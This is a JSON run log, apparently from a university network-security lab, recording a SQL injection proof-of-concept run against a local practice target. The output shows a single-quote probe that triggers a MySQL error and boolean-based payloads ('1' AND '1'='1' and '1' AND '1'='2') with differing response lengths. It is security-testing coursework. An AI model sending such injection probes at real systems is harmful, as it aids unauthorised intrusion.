@@ -1,0 +1,24 @@
+{
+  "cmd": [
+    "C:\\Users\\12396\\.dsh\\dsh-runtimes\\dsh-primary-runtime\\dependencies\\python\\python.exe",
+    "C:\\Users\\12396\\Documents\\ChatGPT\\26271网络安全大作业\\optional1_delivery\\network-security-llm-lab-main\\optional1\\pocs\\v1\\SQLI-001__1.py",
+    "--base-url",
+    "http://127.0.0.1:9081/Less-1/?id=1",
+    "--param",
+    "id"
+  ],
+  "started_at": "2026-10-20T14:41:49+08:00",
+  "returncode": 0,
+  "elapsed_seconds": 0.332,
+  "stdout": "[基线] param='1' status=[200] lengths=[721, 721, 721] error_markers=[]\r\n[单引号探针] param=\"1'\" status=[200] lengths=[832, 832, 832] error_markers=['You have an error in your SQL syntax']\r\n[布尔真] param=\"1' AND '1'='1\" status=[200] lengths=[721, 721, 721] error_markers=[]\r\n[布尔假] param=\"1' AND '1'='2\" status=[200] lengths=[670, 670, 670] error_markers=[]\r\n\r\n=== 观察汇总（不代表漏洞已确认）===\r\n单引号探针触发数据库错误回显标记：['You have an error in your SQL syntax']\r\n布尔真与布尔假平均响应长度差：51.0 字节\r\n重复请求长度稳定性：稳定\r\n以上差异仅为静态候选的初步观察；是否成立需按工作包3的条件核验。\r\n",
+  "stderr": "",
+  "cohort": "v1",
+  "stem": "SQLI-001__1",
+  "poc": "C:\\Users\\12396\\Documents\\ChatGPT\\26271网络安全大作业\\optional1_delivery\\network-security-llm-lab-main\\optional1\\pocs\\v1\\SQLI-001__1.py",
+  "args_redacted": [
+    "--base-url",
+    "http://127.0.0.1:9081/Less-1/?id=1",
+    "--param",
+    "id"
+  ]
+}
